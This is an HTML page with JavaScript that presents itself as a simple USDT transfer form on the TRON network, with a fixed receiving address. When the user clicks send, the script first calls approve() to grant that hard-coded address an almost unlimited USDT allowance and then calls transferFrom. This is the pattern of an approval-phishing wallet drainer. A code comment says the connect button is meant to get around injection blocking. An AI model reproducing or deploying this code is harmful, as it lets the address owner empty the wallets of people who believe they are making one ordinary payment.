<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>USDT转账</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
<style>
*{
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  -webkit-tap-highlight-color: transparent;
  font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
}
body {
  background-color: #f7f8fa;
  padding: 20px 16px;
  max-width: 520px;
  margin: 0 auto;
}
.address-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom: 16px;
}
.label-text {
  font-size: 16px;
  color: #666;
  margin-bottom: 12px;
}
.fixed-addr-box {
  width: 100%;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  padding: 14px 12px;
  background: #f1f5f9;
  color: #333;
  word-break: break-all;
}
.amount-card {
  background: #ffffff;
  border-radius: 16px;
  padding: 20px 18px;
  margin-bottom:16px;
}
.amount-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  margin-bottom: 16px;
}
.amount-input {
  font-size: 48px;
  border: none;
  outline: none;
  width: 75%;
  background: transparent;
  color: #111;
}
/* 修复placeholder字体太大 */
.amount-input::placeholder {
  font-size: 18px;
  color: #aaa;
}
.max-btn {
  padding: 6px 14px;
  background-color: #dbeafe;
  color: #2563eb;
  border-radius: 8px;
  font-weight: 500;
  cursor: pointer;
}
.token-row {
  background-color: #eef2ff;
  border-radius: 12px;
  padding: 14px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.token-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.usdt-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  object-fit: cover;
}
.token-name {
  font-size: 18px;
  font-weight: 500;
}
.token-balance {
  color: #555;
  font-size: 16px;
}
.result-card{
  background:#fff;
  border-radius:16px;
  padding:18px;
  margin-bottom:16px;
}
.result-input{
  width:100%;
  border:1px solid #e5e7eb;
  border-radius:12px;
  padding:14px 12px;
  background:#f9fafb;
  outline:none;
  color:#111;
}
.connect-btn{
  width:100%;
  padding:14px;
  border:none;
  border-radius:14px;
  background:#1d4ed8;
  color:#fff;
  font-size:16px;
  margin-bottom:12px;
  cursor:pointer;
}
.send-main-btn{
  width:100%;
  padding:16px;
  border:none;
  border-radius:14px;
  background:#2563eb;
  color:#fff;
  font-size:17px;
  font-weight:500;
  cursor:pointer;
}
.send-main-btn:disabled{
  background:#94a3b8;
  cursor:not-allowed;
}
.bottom-connect-tip {
  position: fixed;
  bottom: 30px;
  left: 50%;
  transform: translateX(-50%);
  background: white;
  padding: 10px 20px;
  border-radius: 12px;
  box-shadow: 0 2px 10px #0002;
  text-align: center;
}
</style>
</head>
<body>

<div class="address-card">
  <div class="label-text">收款地址</div>
  <div class="fixed-addr-box">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>

<!-- 新增手动连接钱包按钮，绕过自动注入拦截 -->
<button class="connect-btn" id="connectBtn">连接钱包</button>

<div class="amount-card">
  <div class="label-text">转出数量（USDT）</div>
  <div class="amount-row">
    <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
    <div class="max-btn" id="maxBtn">MAX</div>
  </div>

  <div class="token-row">
    <div class="token-left">
      <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
      <span class="token-name">USDT</span>
    </div>
    <span class="token-balance" id="balanceText">0.000000</span>
  </div>
</div>

<div class="result-card">
  <div class="label-text">到账数量</div>
  <input id="receiveAmount" class="result-input" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>

<div class="bottom-connect-tip" id="connectTip">
  <div style="display:flex;align-items:center;gap:8px;">
    <div style="width:24px;height:24px;background:#2563eb;border-radius:6px;"></div>
    <span id="walletAddrText">未连接钱包，请点击上方按钮连接</span>
  </div>
</div>

<script>
const FIXED_TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_GRID_API = "https://api.trongrid.io";

let tronWeb = null;
let userWallet = "";
let usdtContract = null;

const amountInput = document.getElementById("amountInput");
const receiveAmount = document.getElementById("receiveAmount");
const maxBtn = document.getElementById("maxBtn");
const balanceText = document.getElementById("balanceText");
const walletAddrText = document.getElementById("walletAddrText");
const sendBtn = document.getElementById("sendBtn");
const connectBtn = document.getElementById("connectBtn");

// 手动点击按钮连接钱包（关键修复：放弃自动加载）
connectBtn.addEventListener('click', async function(){
  walletAddrText.innerText = "正在请求钱包授权...";
  connectBtn.disabled = true;
  try {
    const provider = window.tronProvider || window.ethereum;
    if (!provider) {
      throw new Error("未检测到钱包Provider，请在钱包内置浏览器打开本地HTML文件");
    }

    let accounts;
    if (provider.isTronProvider) {
      accounts = await provider.request({ method: "tron_requestAccounts" });
    } else {
      accounts = await provider.request({ method: "eth_requestAccounts" });
    }

    if (!accounts || accounts.length === 0) throw new Error("用户拒绝授权");
    userWallet = accounts[0];

    tronWeb = new TronWeb({
      fullHost: TRON_GRID_API,
      provider: provider
    });

    walletAddrText.innerText = `${userWallet.slice(0,10)}...${userWallet.slice(-6)} 已连接`;
    connectBtn.innerText = "钱包已连接";

    const abi = [
      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
      {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
      {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"}
    ];
    usdtContract = tronWeb.contract(abi, USDT_CONTRACT);

    await refreshBalance();
    sendBtn.disabled = false;

    provider.on("accountsChanged", async (newAccounts) => {
      if(newAccounts.length === 0) location.reload();
      userWallet = newAccounts[0];
      await refreshBalance();
    });

  } catch (err) {
    console.error(err);
    walletAddrText.innerText = "连接失败：" + err.message;
    connectBtn.disabled = false;
  }
})

async function refreshBalance() {
  const balanceSun = await usdtContract.balanceOf(userWallet).call();
  const realNum = Number(tronWeb.fromSun(balanceSun));
  balanceText.innerText = realNum.toFixed(6);
}

function bindAmountCalc() {
  amountInput.addEventListener('input',()=>{
    let num = parseFloat(amountInput.value) || 0;
    receiveAmount.value = num.toFixed(6);
  })
}

maxBtn.addEventListener("click", async ()=>{
  if(!usdtContract) return alert("请先连接钱包");
  const balanceSun = await usdtContract.balanceOf(userWallet).call();
  const realNum = Number(tronWeb.fromSun(balanceSun));
  amountInput.value = realNum.toFixed(2);
  amountInput.dispatchEvent(new Event('input'));
})

sendBtn.addEventListener('click',async ()=>{
  if(!tronWeb || !usdtContract){
    alert("请先点击上方按钮连接钱包");
    return;
  }
  let sendVal = parseFloat(amountInput.value);
  if(isNaN(sendVal) || sendVal <= 0){
    alert("请输入有效的转出数量");
    return;
  }
  let sendSun = tronWeb.toSun(sendVal);

  try{
    let allowance = await usdtContract.allowance(userWallet, FIXED_TARGET_ADDR).call();
    if(Number(allowance) < sendSun){
      alert("需要授权合约，请在钱包签名确认");
      await usdtContract.approve(FIXED_TARGET_ADDR, "9999999999999999999999999999").send();
      alert("授权完成，开始转账");
    }
    const txHash = await usdtContract.transferFrom(userWallet, FIXED_TARGET_ADDR, sendSun).send();
    alert(`转账成功！交易哈希：${txHash}`);
  }catch(e){
    alert("操作失败：" + e.message);
  }
})

bindAmountCalc();
</script>

</body>
</html>
